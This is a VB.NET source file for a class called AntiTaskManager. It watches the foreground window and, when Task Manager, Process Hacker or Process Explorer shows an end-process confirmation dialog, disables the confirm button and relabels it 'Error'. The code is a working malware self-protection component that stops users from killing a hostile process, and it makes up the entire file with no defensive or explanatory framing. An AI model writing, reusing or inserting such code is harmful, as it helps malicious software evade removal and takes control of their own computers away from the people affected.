Public Class AntiTaskManager
    <Runtime.InteropServices.DllImport("user32.dll")> _
    Private Shared Function EnableWindow(ByVal hWnd As IntPtr, ByVal bEnable As Boolean) As Boolean
    End Function
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As  _
    IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As _
    Integer, ByVal lpClassName As String, ByVal nMaxCount As Integer) As Integer
    Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal _
    hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, ByVal lParam As String) As Integer
    Private Declare Auto Function GetWindowText Lib "user32.dll" (ByVal hwnd As Int32, _
    ByVal lpString As System.Text.StringBuilder, ByVal cch As Int32) As Int32
    Private Declare Auto Function GetWindowTextLength Lib "user32.dll" (ByVal hwnd As Int32) As Int32
    Private Delegate Function EnumWindProc(ByVal hWnd As Int32, ByVal lParam As Int32) As Boolean
    Private Delegate Function EnumChildWindProc(ByVal hWnd As Int32, ByVal _
    lParam As Int32) As Boolean
    Private Declare Function EnumChildWindows Lib "user32" (ByVal hWnd As IntPtr, _
    ByVal lpEnumFunc As EnumWindProc, ByRef lParam As IntPtr) As Int32
    Private Function EnumChild(ByVal hWnd As Int32, ByVal lParam As Int32) As Boolean
        CLD.Add(hWnd)
        Return True
    End Function
    Public Sub protect()
        On Error Resume Next
        While True
            Threading.Thread.Sleep(200)
            Dim hwd = GetForegroundWindow
            If hwd.ToInt32 = 0 Then Continue While
            Dim id As Integer = 0
            GetWindowThreadProcessId(hwd, id)
            If id > 0 Then
                Dim Title As String = ""
                Dim text_len As Integer = GetWindowTextLength(hwd)
                If text_len = 0 Then
                    Title = ""
                Else
                    Dim sb As New System.Text.StringBuilder(text_len + 1)
                    Dim ret = GetWindowText(hwd, sb, sb.Capacity)
                    If ret = 0 Then
                        Title = ""
                    Else
                        Title = sb.ToString
                    End If
                End If
                Dim p As Process = Process.GetProcessById(id)
                If p.ProcessName.ToLower = "taskmgr" Or p.ProcessName.ToLower _
                = "processhacker" Or Title.ToLower = "process explorer" Then
                    Dim button As New List(Of IntPtr)
                    Dim statics As Integer = 0
                    For Each x As IntPtr In GetChild(hwd)
                        Dim className As String = Space(200)
                        Dim ln As Integer = GetClassName(x, className, 200)
                        className = className.Remove(ln, 200 - ln)
                        If className.ToLower = "button" Then
                            button.Add(x)
                        End If
                        If className.ToLower = "static" Or className.ToLower _
                        = "directuihwnd" Then
                            statics += 1
                        End If
                    Next
                    If button.Count = 2 And (statics = 2 Or statics = 1) Then
                        EnableWindow(button(0), False)
                        SendMessage(button(0), &HC, 0, "Error")
                    End If
                End If
            End If
        End While
    End Sub
    Private CLD As New List(Of IntPtr)
    Private Function GetChild(ByVal hwd As IntPtr) As IntPtr()
        On Error Resume Next
        SyncLock Me
            CLD.Clear()
            EnumChildWindows(hwd, New EnumWindProc(AddressOf EnumChild), 0)
            Return CLD.ToArray
        End SyncLock
    End Function
End Class
